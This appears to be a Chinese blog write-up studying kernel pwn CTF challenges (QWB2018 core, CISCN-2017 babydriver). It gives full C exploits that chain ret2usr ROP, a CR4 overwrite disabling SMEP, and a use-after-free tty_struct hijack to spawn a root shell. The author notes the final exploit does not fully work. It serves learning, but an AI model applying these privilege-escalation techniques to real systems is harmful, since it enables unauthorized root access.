# ret2usr

在上一篇文章中，我们借助一道kernel pwn的入门题——core完成了kernel ROP的学习，本系列按照[与上一篇文章相同的资料](https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9A%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core-1)的顺序继续学习与复现。本篇文章学习的漏洞技术为：ret2usr

仍然使用上一篇文章的例题，没有开启SMAP/SMEP，有从内核直接执行用户空间代码的可能性。我们已经知道在本题中能够很容易地获取到两个关键函数的地址，我们在用户态写一个调用提权函数的代码片段，但是不在用户态执行，而是将其插入到ROP链中由内核来执行，与上一题的效果是相同的。只需要对上一题的代码进行一些部分修改即可。

exp:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ioctl.h>

unsigned long long commit_creds = 0, prepare_kernel_cred = 0;	// address of to key function
const unsigned long long commit_creds_base = 0xFFFFFFFF8109C8E0;

const unsigned long long swapgs_popfq_ret = 0xffffffff81a012da;
const unsigned long long iretq = 0xFFFFFFFF81A00987;

int fd = 0;	// file pointer of process 'core'

void saveStatus();
void get_function_address();
void core_read(char* buf);
void change_off(int off);
void core_copy_func(unsigned long long nbytes);
void print_binary(char* buf, int length);
void rise_cred();
void shell();

size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void core_read(char* buf){
	ioctl(fd, 0x6677889B, buf);
}

void change_off(int off){
	ioctl(fd, 0x6677889C, off);
}

void core_copy_func(unsigned long long nbytes){
	ioctl(fd, 0x6677889A, nbytes);
}

// This function is used to get the addresses of two key functions from /tmp/kallsyms
void get_function_address(){
	FILE* sym_table = fopen("/tmp/kallsyms", "r");	// including all address of kernel functions
	if(sym_table == NULL){
		printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
		exit(1);
	}
	unsigned long long addr = 0;
	char type[0x10];
	char func_name[0x100];
	// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
	while(fscanf(sym_table, "%llx%s%s", &addr, type, func_name)){
		if(commit_creds && prepare_kernel_cred)		// two addresses of key functions are all found, return directly.
			return;
		if(!strcmp(func_name, "commit_creds")){		// function "commit_creds" found
			commit_creds = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
		}else if(!strcmp(func_name, "prepare_kernel_cred")){
			prepare_kernel_cred = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
		}
	}
}

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length){
	int index = 0;
	char output_buffer[80];
	memset(output_buffer, '\0', 80);
	memset(output_buffer, ' ', 0x10);
	for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
		char temp_buffer[0x10];
		memset(temp_buffer, '\0', 0x10);
		sprintf(temp_buffer, "%#5x", index);
		strcpy(output_buffer, temp_buffer);
		output_buffer[5] = ' ';
		output_buffer[6] = '|';
		output_buffer[7] = ' ';
		for(int j=0; j<16; j++){
			if(index+j >= length)
				sprintf(output_buffer+8+3*j, "   ");
			else{
				sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
				if(!isprint(buf[index+j]))
					output_buffer[58+j] = '.';
				else
					output_buffer[58+j] = buf[index+j];
			}
		}
		output_buffer[55] = ' ';
		output_buffer[56] = '|';
		output_buffer[57] = ' ';
		printf("%s\n", output_buffer);
		memset(output_buffer+58, '\0', 16);
		index += 16;
	}
}

void rise_cred(){
	// define two function pointer
	void* (*prepare_kernel_credp)(void*) = prepare_kernel_cred;
	int (*commit_credsp)(void*) = commit_creds;
	commit_credsp(prepare_kernel_credp(NULL));
}

void shell(){
	if(getuid()){
		printf("\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m");
		exit(1);
	}
	printf("\033[32m\033[1m[+] Getting the root......\033[0m\n");
	system("/bin/sh");
	exit(0);
}

int main(){
	saveStatus();
	fd = open("/proc/core", 2);		// open the process
	if(!fd){
		printf("\033[31m\033[1m[x] Error: Cannot open process \"core\"\n\033[0m");
		exit(1);
	}
	char buffer[0x100] = {0};
	get_function_address();		// get addresses of two key function
	
	unsigned long long base_offset = commit_creds - commit_creds_base;
	printf("\033[34m\033[1m[*] KASLR offset: \033[0m%#llx\n", base_offset);
	
	change_off(0x40);			// change the offset so that we can get canary later
	core_read(buffer);			// get canary
	
	printf("\033[34m\033[1m[*] Contents in buffer here:\033[0m\n");	// print content in buffer
	print_binary(buffer, 0x40);
	
	unsigned long long canary = ((size_t*)&buffer)[0];
	printf("\033[35m\033[1m[*] The value of canary is the first 8 bytes: \033[0m%#llx\n", canary);
	
	size_t ROP[100] = {0};
	memset(ROP, 0, 800);
	int idx = 0;
	for(int i=0; i<10; i++)
		ROP[idx++] = canary;
	ROP[idx++] = (unsigned long long)rise_cred;
	ROP[idx++] = swapgs_popfq_ret + base_offset;	// step 1 of returning to user mode: swapgs
	ROP[idx++] = 0;
	ROP[idx++] = iretq + base_offset;				// step 2 of returning to user mode: iretq
	// after the iretq: return address, user cs, user rflags, user sp, user ss
	ROP[idx++] = (unsigned long long)shell;
	ROP[idx++] = user_cs;
	ROP[idx++] = user_rflags;
	ROP[idx++] = user_sp;
	ROP[idx++] = user_ss;
	
	printf("\033[34m\033[1m[*] Our rop chain looks like: \033[0m\n");
	print_binary((char*)ROP, 0x100);
	
	write(fd, ROP, 0x800);
	core_copy_func(0xffffffffffff0100);
	return 0;
}
```

# Kernel Use After Free & SMAP/SMEP bypass
与用户态类似，内核中也可以利用UAF漏洞，但内存分配的方式完全不同。本漏洞利用使用另一道经典Kernel Pwn入门例题——CISCN-2017 babydriver。同时本题还需要进行SMAP/SMEP的绕过，使我们能够ret2usr。
在本题中，给的文件系统有bzImage而没有vmlinux，但我们需要使用vmlinux获取到有用的gadget。此时就需要一个已经写好的官方脚本——extract_vmlinux进行vmlinux的提取。这是一个bash文件，只有几十行：

```bash
#!/bin/sh
# SPDX-License-Identifier: GPL-2.0-only
# ----------------------------------------------------------------------
# extract-vmlinux - Extract uncompressed vmlinux from a kernel image
#
# Inspired from extract-ikconfig
# (c) 2009,2010 Dick Streefland <dick@streefland.net>
#
# (c) 2011      Corentin Chary <corentin.chary@gmail.com>
#
# ----------------------------------------------------------------------

check_vmlinux()
{
	# Use readelf to check if it's a valid ELF
	# TODO: find a better to way to check that it's really vmlinux
	#       and not just an elf
	readelf -h $1 > /dev/null 2>&1 || return 1

	cat $1
	exit 0
}

try_decompress()
{
	# The obscure use of the "tr" filter is to work around older versions of
	# "grep" that report the byte offset of the line instead of the pattern.

	# Try to find the header ($1) and decompress from here
	for	pos in `tr "$1\n$2" "\n$2=" < "$img" | grep -abo "^$2"`
	do
		pos=${pos%%:*}
		tail -c+$pos "$img" | $3 > $tmp 2> /dev/null
		check_vmlinux $tmp
	done
}

# Check invocation:
me=${0##*/}
img=$1
if	[ $# -ne 1 -o ! -s "$img" ]
then
	echo "Usage: $me <kernel-image>" >&2
	exit 2
fi

# Prepare temp files:
tmp=$(mktemp /tmp/vmlinux-XXX)
trap "rm -f $tmp" 0

# That didn't work, so retry after decompression.
try_decompress '\037\213\010' xy    gunzip
try_decompress '\3757zXZ\000' abcde unxz
try_decompress 'BZh'          xy    bunzip2
try_decompress '\135\0\0\0'   xxx   unlzma
try_decompress '\211\114\132' xy    'lzop -d'
try_decompress '\002!L\030'   xxx   'lz4 -d'
try_decompress '(\265/\375'   xxx   unzstd

# Finally check for uncompressed images or objects:
check_vmlinux $img

# Bail out:
echo "$me: Cannot find vmlinux." >&2
```

使用方法：``./extract_vmlinux bzImage > vmlinux``
执行后就能够在文件夹中找到vmlinux文件供我们分析。

**Step 1: 读取/proc/kallsyms获取内核函数地址**

本题与上一题均可以使用cat命令获取到内核函数的地址，但有所不同的是，在上一题，我们读取的是/tmp/kallsyms，是一个副本而不是/proc/kallsyms本身。/proc/kallsyms存放所有内核函数的地址，那为什么出题人还要大费周章地复制一份，为什么不能直接读取呢，/proc文件夹又没有设置权限。我们不妨试一下，在上一题直接读取/proc/kallsyms会打印出什么东西。
![](https://img-blog.csdnimg.cn/c109d13acad24dd5a1fa2698bb77c759.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_15,color_FFFFFF,t_70,g_se,x_16)
嗯？为什么这里的地址全都变成0了？仔细查看两道题中init文件的不同之处，我们发现了一丝端倪：
![](https://img-blog.csdnimg.cn/3b3dbd355827494da19b5082f9babf8c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16)
左边是这道题的init文件，右边是上一道题的init文件，我们发现上一道题对/proc做了一些额外的处理。查阅[资料](https://blog.csdn.net/gatieme/article/details/78311841?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165088900816782350946531%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165088900816782350946531&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-78311841.142^v9^control,157^v4^control&utm_term=%2Fproc%2Fsys%2Fkernel%2Fkptr_restrict&spm=1018.2226.3001.4187)后发现，问题出在``/proc/sys/kernel/kptr_restrict``。当其值为1时，普通用户无法获取到内核的任何地址值。但在本题中并没有这样的命令，因此可以直接读取/proc/kallsyms文件获取所有内核函数的地址。又因为本题中没有开启KASLR，因此两个关键函数的地址总是不变的，我们使用cat命令获取之后将其直接复制到我们的exp中就可以了。
![](https://img-blog.csdnimg.cn/13e03819a5b64424b4d6aa57d4ff28e7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16)

**Step 2: 绕过SMAP/SMEP**

在boot.sh中很容易就能发现本kernel开启了SMAP/SMEP保护。在这种保护下内核无法直接访问用户空间的内容，其中SMEP表示内核无法执行用户空间的代码。我们可以通过修改CR4寄存器的第20位标记将这个保护手动关闭。
![](https://img-blog.csdnimg.cn/ba76e314e8eb43c69eb314798b0b7f79.png)
我们使用前面通过脚本获取的vmlinux获取gadget，从中提取到了修改cr4寄存器的gadget地址为0xffffffff81004d80。
![](https://img-blog.csdnimg.cn/2a8534129bd54f498598b74f133b7ce9.png)
但在修改cr4之前，我们需要确认一下cr4寄存器中的值到底是什么，毕竟我们要修改的只是SMEP保护，对于其他位不应做任何修改。由于cr4属于控制寄存器，在内核运行过程中一般不会改变。我们查询gadgets.txt看看能不能通过普通的寄存器将cr4的值套出来。
![](https://img-blog.csdnimg.cn/7005e6236a1b416e9ee2e141828757f3.png)
这里我们选择将cr4寄存器的值保存到rax中，之后使用gdb进行调试，在此处下断点并跳转到此处即可查看。注意：本题的boot.sh中没有开启-s选项，需要手动修改才能将kernel映射到TCP的1234端口进行调试。

**调试方法：首先打开内核，之后在另一个终端输入``gdb vmlinux``，输入``target remote localhost:1234``即可attach到1234端口进行内核调试。**
![](https://img-blog.csdnimg.cn/f2320a1dea734546897e96e07b0d6ad3.png)
在上图中，我们刚刚引导内核执行了mov rax,cr4指令（直接输入reg cr4是无法显示cr4寄存器的值的），可以看到cr4的值为0x1006f0，其中最高位的1代表SMEP保护开启。因此我们只需要将cr4的值改为0x6f0就能关闭保护。

这样一来，我们就知道了关闭保护的方法了。关闭保护之后，我们就可以使用上一道题的ROP进行提权，在本题中，ROP应该在最后一步被触发。我们写出ROP链：

```c
	unsigned long long rop[20];
	int idx = 0;
	rop[idx++] = poprdi_ret;			// mov rdi, 6f0h
	rop[idx++] = 0x6f0;
	rop[idx++] = movcr4rdi_poprbp_ret;	// close SMEP
	rop[idx++] = 0;						// for pop rbp
	rop[idx++] = rise_cred;
	rop[idx++] = swapgs_poprbp_ret;		// ready to return to user mode
	rop[idx++] = 0;
	rop[idx++] = iretq;
	rop[idx++] = shell;
	rop[idx++] = user_cs;
	rop[idx++] = user_rflags;
	rop[idx++] = user_sp;
	rop[idx++] = user_ss;
```

**Step 3: UAF**
在ROP确定之后，接下来要思考的就是如何通过UAF触发ROP。

![](https://img-blog.csdnimg.cn/488ede4b67be4f60a8983c16f61abe71.png)
在模块加载时，会创建一个设备名为babydev，在/dev/babydev。
![](https://img-blog.csdnimg.cn/b7b80117aaeb476980917ed990f21c65.png)
在本题的file_operations结构体中，定义有open函数对应的函数指针为babyopen，在我们打开/dev/babydev时会执行这个函数。
![](https://img-blog.csdnimg.cn/cbbed073e01b4dde948db6741ea7fadb.png)

```c
static __always_inline __alloc_size(3) void *kmem_cache_alloc_trace(struct kmem_cache *s,
								    gfp_t flags, size_t size)
{
	void *ret = kmem_cache_alloc(s, flags);

	ret = kasan_kmalloc(s, ret, size, flags);
	return ret;
}
```
上面是kmem_cache_alloc_trace函数的源码，这是一个内核内存分配的函数，可以看到babyopen中分配的内存大小为0x40，分配得到的内存指针会保存到一个全局变量babydev_struct之中。
![](https://img-blog.csdnimg.cn/a71e425e15624b2ab6a60fc4cfbda452.png)
在babyrelease函数中会将我们分配的指针释放。但是由于模块在内存中只会加载一个，当我们同时打开两次此设备时，两设备实际上是相同的，全局变量共用，在一个设备中kfree，但是在另一个设备中仍然可以进行操作，这便是UAF，与用户态pwn相同。我们以可读可写的方式打开此设备，因此open函数的第二个参数为2。（下图为参数说明）
![](https://img-blog.csdnimg.cn/dc7fb4e8310142b2ad8d74dd261c35d6.png)
再来看下babyioctl函数。
![](https://img-blog.csdnimg.cn/6b324097cb46482e8a4ace2b6f535699.png)
这里的反汇编似乎有点问题，kmalloc的第一个参数应该是size，但是这里肯定不是传入一个未初始化的值。![](https://img-blog.csdnimg.cn/be372a278a9e4bb98daf1f192dc85796.png)
从汇编可以知道这里传入kmalloc的第一个参数实际上就是我们ioctl函数调用的第三个参数，也即我们可以通过ioctl函数修改这里分配到的内存的大小。

![](https://img-blog.csdnimg.cn/1e5c6013c598453db59bea4f720164bc.png)
经过实验发现，此处的UAF利用没有问题，能够通过释放的指针修改被释放空间的值。

> （摘自[资料](https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AKernel-UAF-stack-migitation-SMEP-bypass-ret2usr)）
> 在 /dev 下有一个伪终端设备 ptmx ，在我们打开这个设备时内核中会创建一个 tty_struct 结构体，与其他类型设备相同，tty驱动设备中同样存在着一个存放着函数指针的结构体 tty_operations
那么我们不难想到的是我们可以通过 UAF 劫持 /dev/ptmx 这个设备的 tty_struct 结构体与其内部的 tty_operations 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针

![](https://img-blog.csdnimg.cn/8ac856f765df40aea13f56983d852969.png)
可以看到，通过UAF我们可以成功读取到tty_struct的内容。

```c
struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
	int index;

	/* Protects ldisc changes: Lock tty not pty */
	struct ld_semaphore ldisc_sem;
	struct tty_ldisc *ldisc;

	struct mutex atomic_write_lock;
	struct mutex legacy_mutex;
	struct mutex throttle_mutex;
	struct rw_semaphore termios_rwsem;
	struct mutex winsize_mutex;
	spinlock_t ctrl_lock;
	spinlock_t flow_lock;
	/* Termios values are protected by the termios rwsem */
	struct ktermios termios, termios_locked;
	struct termiox *termiox;	/* May be NULL for unsupported */
	char name[64];
	struct pid *pgrp;		/* Protected by ctrl lock */
	struct pid *session;
	unsigned long flags;
	int count;
	struct winsize winsize;		/* winsize_mutex */
	unsigned long stopped:1,	/* flow_lock */
		      flow_stopped:1,
		      unused:BITS_PER_LONG - 2;
	int hw_stopped;
	unsigned long ctrl_status:8,	/* ctrl_lock */
		      packet:1,
		      unused_ctrl:BITS_PER_LONG - 9;
	unsigned int receive_room;	/* Bytes free for queue */
	int flow_change;

	struct tty_struct *link;
	struct fasync_struct *fasync;
	int alt_speed;		/* For magic substitution of 38400 bps */
	wait_queue_head_t write_wait;
	wait_queue_head_t read_wait;
	struct work_struct hangup_work;
	void *disc_data;
	void *driver_data;
	struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096

	int closing;
	unsigned char *write_buf;
	int write_cnt;
	/* If the tty has a pending do_SAK, queue it here - akpm */
	struct work_struct SAK_work;
	struct tty_port *port;
};
```

这里需要注意哪一个索引才是tty_operations的指针。magic占4字节，kref的声明见下：

```c
struct kref {
	atomic_t refcount;
};

typedef struct {
	int counter;
} atomic_t;
```

因此kref也是占4字节。后面的两个struct指针各占8字节，因此tty_operations应该在结构体中偏移为0x18的位置，也即上图中的0xffffffff81a74f80。我们可以将其修改为我们伪造的tty_operations，将其中write对应的函数指针修改为某一个固定的gadget，再对/dev/ptmx调用write即可到达我们想要的gadget处，也就能够调试了。

![](https://img-blog.csdnimg.cn/7b5c4537c2ff4f8bb5cd13c60d736648.png)
发现有rax指向tty_operations。这是我们在内核中唯一可以控制的地址，因此思路是以其为跳板进行栈迁移以触发ROP。这就需要mov rsp, rax的gadget了。
![](https://img-blog.csdnimg.cn/6aac399eea6a45aea34b640be6f712cc.png)
![](https://img-blog.csdnimg.cn/3bb59c3275c74dcfab5a54ceeac4771f.png)
发现只有0xffffffff8181bfc5的gadget是可用的，后面的jmp也就相当于是ret了。
下面是tty_operations的结构声明：

```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct inode *inode, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
				struct serial_icounter_struct *icount);
#ifdef CONFIG_CONSOLE_POLL
	int (*poll_init)(struct tty_driver *driver, int line, char *options);
	int (*poll_get_char)(struct tty_driver *driver, int line);
	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
	const struct file_operations *proc_fops;
};
```
可以看到其中write的函数指针应该在索引为7的位置。因此我们将这里修改为mov rsp, rax的指针。这里，原资料巧妙构造了tty_operations的结构使得其能成功触发ROP。

```c
    size_t fake_op[0x30];
    for(int i = 0; i < 0x10; i++)
        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;

    fake_op[0] = POP_RAX_RET;
    fake_op[1] = rop;
```
首先，使用write函数触发栈迁移，此时栈应该在fake_op的头部位置。之后ret到pop rax ; ret的gadget，将rax赋值为事先构造好的ROP链，然后ret。**注意：ret后面又是一个mov rsp, rax，这就使得rsp自然地被迁移到了ROP上。**至此，一切顺理成章地完成了。

笔者无比欣喜地开始测试，想看到那个梦寐以求的'#'出现，但是kernel却甩给我一堆报错信息，1s之内难以截屏，但大致说的是：unable to handle kernel paging request。

![](https://img-blog.csdnimg.cn/b837e5b8df6446df82863e6bdbffe367.png)
![](https://img-blog.csdnimg.cn/abb50a40f0a54b39a41c979de4c01ad9.png)
又回去用git库中带的exp试了一下，没有问题啊。什么问题呢？终端在最后显示的信息中，有笔者写入到程序中的标志信息，即已经进入了调用system("/bin/sh")的函数，但是还是报错了，报的错还不一样。。。。。。
给自己代码稍微该了下。好，现在报错是一样的且不会重启了：

```
[+] Congratulations! root got......
[    4.253787] traps: uaf.o[90] general protection ip:4110a2 sp:7ffd42a4da38 error:0 in uaf.o[401000+96000]
[    4.255947] device release
[    4.256551] bad magic number for tty struct (5:2) in tty_release
Segmentation fault
```

注意到成功的elf文件中，退出root后也会产生同样的错误。

![](https://img-blog.csdnimg.cn/18cca2dc76834b038295b7d5cf8c2565.png)
更奇妙的是，当我在此基础上添加几个printf时，居然又出现了kernel panic错误。推测是编译器问题，暂时无法解决(ノへ￣、)，但是原理算是全部清楚了。

最终exp：（能够执行到shell函数但无法提权）

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ioctl.h>

const unsigned long long commit_creds = 0xffffffff810a1420, prepare_kernel_cred = 0xffffffff810a1810;
#define movcr4rdi_poprbp_ret 0xffffffff81004d80	// need to move 0x6f0 to cr4
#define swapgs_poprbp_ret 0xffffffff81063694
#define iretq 0xffffffff8181a797
#define poprdi_ret 0xffffffff810d238d
#define movrsprax_decebx_ret 0xffffffff8181bfc5
#define poprax_ret 0xffffffff8100ce6e

unsigned long long fake_tty_operations[30];

void saveStatus();
void print_binary(char* buf, int length);
void rise_cred();
void shell();

size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("\033[34m\033[1m[*] Status has been saved.\n\033[0m");
}

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length){
	printf("---------------------------------------------------------------------------\n");
	printf("Address info starting in %p:\n", buf);
	int index = 0;
	char output_buffer[80];
	memset(output_buffer, '\0', 80);
	memset(output_buffer, ' ', 0x10);
	for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
		char temp_buffer[0x10];
		memset(temp_buffer, '\0', 0x10);
		sprintf(temp_buffer, "%#5x", index);
		strcpy(output_buffer, temp_buffer);
		output_buffer[5] = ' ';
		output_buffer[6] = '|';
		output_buffer[7] = ' ';
		for(int j=0; j<16; j++){
			if(index+j >= length)
				sprintf(output_buffer+8+3*j, "   ");
			else{
				sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
				if(!isprint(buf[index+j]))
					output_buffer[58+j] = '.';
				else
					output_buffer[58+j] = buf[index+j];
			}
		}
		output_buffer[55] = ' ';
		output_buffer[56] = '|';
		output_buffer[57] = ' ';
		printf("%s\n", output_buffer);
		memset(output_buffer+58, '\0', 16);
		index += 16;
	}
	printf("---------------------------------------------------------------------------\n");
}

void rise_cred(){
	// define two function pointer
	// printf("\033[32m\033[1m[+] Ready to execute commit_creds(prepare_kernel_cred(NULL))......\033[0m\n");
	void* (*prepare_kernel_credp)(void*) = prepare_kernel_cred;
	int (*commit_credsp)(void*) = commit_creds;
	(*commit_credsp)((*prepare_kernel_credp)(NULL));
	// printf("\033[32m\033[1m[+] commit_creds(prepare_kernel_cred(NULL)) executed.\033[0m\n");
}

void shell(){
	// if(getuid()){
	// 	printf("\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m");
	// 	exit(1);
	// }
	// printf("\033[32m\033[1m[+] Congratulations! root got......\033[0m\n");
	system("/bin/sh");
	exit(0);
}

int main(){
	saveStatus();
	
	unsigned long long rop[0x20] = {0};
	int idx = 0;
	rop[idx++] = poprdi_ret;			// mov rdi, 6f0h
	rop[idx++] = 0x6f0;
	rop[idx++] = movcr4rdi_poprbp_ret;	// close SMEP
	rop[idx++] = 0;						// for pop rbp
	rop[idx++] = rise_cred;
	rop[idx++] = swapgs_poprbp_ret;		// ready to return to user mode
	rop[idx++] = 0;
	rop[idx++] = 0xffffffff814e35ef;
	rop[idx++] = shell;
	rop[idx++] = user_cs;
	rop[idx++] = user_rflags;
	rop[idx++] = user_sp;
	rop[idx++] = user_ss;
	
	unsigned long long fake_tty_struct[0x20];

	for(int i=0; i<0x10; i++)
		fake_tty_operations[i] = movrsprax_decebx_ret;
	fake_tty_operations[0] = poprax_ret;
	fake_tty_operations[1] = (unsigned long long)rop;
		
	int f1 = open("/dev/babydev", 2);
	int f2 = open("/dev/babydev", 2);
	ioctl(f1, 0x10001, 0x2e0);
	close(f1);
	
	int f3 = open("/dev/ptmx", 2|O_NOCTTY);
	
	read(f2, fake_tty_struct, 0x20);
	
	fake_tty_struct[3] = (unsigned long long)fake_tty_operations;		// change the tty_operations pointer to our fake pointer
	
	char buf[0x8] = {0};
	write(f2, fake_tty_struct, 0x20);
	
	write(f3, buf, 8);
	return 0;
}
```
